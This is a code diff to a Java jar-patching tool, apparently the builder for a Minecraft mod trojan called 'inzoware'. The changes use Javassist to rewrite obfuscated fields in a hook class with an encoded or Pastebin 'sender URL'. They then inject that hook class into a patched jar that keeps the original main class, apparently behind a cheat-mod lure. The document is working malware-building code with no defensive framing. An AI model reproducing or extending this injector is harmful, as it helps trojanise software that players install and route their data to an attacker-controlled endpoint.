@@ -9,15 +9,18 @@ import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
 import java.nio.file.*;
+import javassist.CannotCompileException;
+import javassist.CtField;
+import javassist.NotFoundException;
 
-
-import net.minecraftforge.fml.common.Mod;
-import net.minecraftforge.fml.common.Mod.EventHandler;
+import net.minecraftforge.common.MinecraftForge;
 import net.minecraftforge.fml.common.event.FMLInitializationEvent;
+import net.minecraftforge.fml.common.event.FMLPostInitializationEvent;
+import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
 
 public class Injector {
 
-    public static boolean patchFile(String orig, String out, SimpleConfig config, boolean override, boolean quiet) {
+    public static boolean patchFile(String orig, String out, SimpleConfig config, boolean override, boolean quiet) throws NotFoundException {
         Path input = Paths.get(orig);
         Path output = Paths.get(out);
 
@@ -71,6 +74,10 @@ public class Injector {
 
         String name = (String) ("" + input.getFileName());
         String mainClass = (String) (config.MainClass);
+        String EncodedURL = (String) (config.encodedSenderURL);
+        String HooksClass = "com.inzo.technologies.inzoware.hooks.Hooks374"; 
+
+
 
         if(!quiet)
             System.out.println("[Injector] Found Jar name: " + name + "\n[Injector] Inputted main class: " + mainClass);
@@ -183,6 +190,66 @@ public class Injector {
             Files.copy(patchedFile, target, StandardCopyOption.REPLACE_EXISTING);
             if(!quiet)
                 System.out.println("[Injector] Finished writing file: " + output.getFileName());
+        }catch(IOException e){
+            if(!quiet) {
+                System.out.println("[Injector] Unknown IO error when copying new main class.");
+                e.printStackTrace();
+            }
+            return false;
+        }
+
+
+        if(config.pastebinurl){
+                    ClassPool pool = ClassPool.getDefault();
+                try{
+                    CtClass pt = pool.get("com.inzo.technologies.inzoware.hooks.Hooks374");
+                    CtField field = pt.getField("IIllIlIll");
+                    pt.removeField(field);
+                    System.out.println("[Injector] Removed Field IIllIlIll ");
+                    CtField newField = CtField.make("public static final String IIllIlIll=\""+ EncodedURL +"\";", pt);
+                    pt.addField(newField);
+                    System.out.println("[Injector] Added Field IIllIlIll With URL"+ EncodedURL);  
+                    pt.writeFile();
+                } catch (NotFoundException e) {
+                    e.printStackTrace();System.exit(-1);
+                } catch (CannotCompileException e) {
+                    e.printStackTrace();System.exit(-1);
+                } catch (IOException e) {
+                    e.printStackTrace();System.exit(-1);
+            }
+        } else {
+                ClassPool pool = ClassPool.getDefault();
+                try{
+                    CtClass pt = pool.get("com.inzo.technologies.inzoware.hooks.Hooks374");
+                    CtField field = pt.getField("lIIlIlIll");
+                    pt.removeField(field);
+                    System.out.println("[Injector] Removed Field lIIlIlIll ");
+                    CtField newField = CtField.make("public static final String lIIlIlIll=\""+ EncodedURL +"\";", pt);
+                    pt.addField(newField);
+                    System.out.println("[Injector] Added Field lIIlIlIll With URL"+ EncodedURL);
+                    pt.writeFile();
+                } catch (NotFoundException e) {
+                    e.printStackTrace();System.exit(-1);
+                } catch (CannotCompileException e) {
+                    e.printStackTrace();System.exit(-1);
+                } catch (IOException e) {
+                    e.printStackTrace();System.exit(-1);
+            }
+        }   
+
+        /*--- Write new main class ---*/
+
+        if(!quiet)
+            System.out.println("[Injector] Writing main class.");
+
+        try {
+            //Write final patched file
+            patchedFile = Paths.get(HooksClass.replace(".", "/") + ".class");
+            target      = outStream.getPath("/" + HooksClass.replace(".", "/") + ".class");
+
+            Files.copy(patchedFile, target, StandardCopyOption.REPLACE_EXISTING);
+            if(!quiet)
+                System.out.println("[Injector] Finished writing file: " + output.getFileName());
             outStream.close();
         }catch(IOException e){
             if(!quiet) {
@@ -197,10 +264,12 @@ public class Injector {
 
     //Simplifed config for injector gui
     public static class SimpleConfig {
+        public boolean pastebinurl;
         public String encodedSenderURL;
         public String MainClass;
 
-        public SimpleConfig(String s1, String s2) {
+        public SimpleConfig(boolean b1, String s1, String s2) {
+            pastebinurl = b1;
             encodedSenderURL = s1;
             MainClass = s2;
         }
@@ -247,7 +316,6 @@ public class Injector {
             "com.inzo.technologies.inzoware.utils.Client",      
             "com.inzo.technologies.inzoware.utils.Client$1",      
             "com.inzo.technologies.inzoware.utils.DupingUtils",
-            "com.inzo.technologies.inzoware.utils.INZOUtils",   
             "com.inzo.technologies.inzoware.utils.InitUtils"                                                                  
     };
 }
